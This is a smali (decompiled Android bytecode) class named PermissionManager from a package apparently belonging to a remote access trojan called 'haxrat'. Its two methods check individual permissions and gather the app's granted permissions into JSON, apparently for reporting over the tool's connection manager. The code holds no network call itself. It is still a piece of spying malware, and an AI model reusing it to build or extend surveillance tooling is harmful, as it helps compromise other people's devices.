.class public Lcom/hax4us/haxrat/PermissionManager;
.super Ljava/lang/Object;
.source "PermissionManager.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 30
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static canIUse(Ljava/lang/String;)Z
    .locals 6

    .prologue
    .line 28
    move-object v0, p0

    sget-object v3, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    move-object v4, v0

    sget-object v5, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v5}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Landroid/content/pm/PackageManager;->checkPermission(Ljava/lang/String;Ljava/lang/String;)I

    move-result v3

    const/4 v4, 0x0

    if-ne v3, v4, :cond_0

    const/4 v3, 0x1

    move v0, v3

    .line 29
    :goto_0
    return v0

    :cond_0
    const/4 v3, 0x0

    move v0, v3

    goto :goto_0
.end method

.method public static getGrantedPermissions()Lorg/json/JSONObject;
    .locals 10

    .prologue
    .line 14
    new-instance v6, Lorg/json/JSONObject;

    move-object v9, v6

    move-object v6, v9

    move-object v7, v9

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    move-object v1, v6

    .line 16
    :try_start_0
    new-instance v6, Lorg/json/JSONArray;

    move-object v9, v6

    move-object v6, v9

    move-object v7, v9

    invoke-direct {v7}, Lorg/json/JSONArray;-><init>()V

    move-object v2, v6

    .line 17
    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v6}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v6

    sget-object v7, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v7}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v7

    const/16 v8, 0x1000

    invoke-virtual {v6, v7, v8}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v6

    move-object v3, v6

    .line 18
    const/4 v6, 0x0

    move v4, v6

    :goto_0
    move v6, v4

    move-object v7, v3

    iget-object v7, v7, Landroid/content/pm/PackageInfo;->requestedPermissions:[Ljava/lang/String;

    array-length v7, v7

    if-lt v6, v7, :cond_0

    .line 21
    move-object v6, v1

    const-string v7, "permissions"

    move-object v8, v2

    invoke-virtual {v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v6

    .line 24
    :goto_1
    move-object v6, v1

    move-object v0, v6

    return-object v0

    .line 19
    :cond_0
    move-object v6, v3

    iget-object v6, v6, Landroid/content/pm/PackageInfo;->requestedPermissionsFlags:[I

    move v7, v4

    aget v6, v6, v7

    const/4 v7, 0x2

    and-int/lit8 v6, v6, 0x2

    const/4 v7, 0x0

    if-eq v6, v7, :cond_1

    move-object v6, v2

    move-object v7, v3

    iget-object v7, v7, Landroid/content/pm/PackageInfo;->requestedPermissions:[Ljava/lang/String;

    move v8, v4

    aget-object v7, v7, v8

    invoke-virtual {v6, v7}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v6

    .line 18
    :cond_1
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 21
    :catch_0
    move-exception v6

    move-object v2, v6

    goto :goto_1
.end method
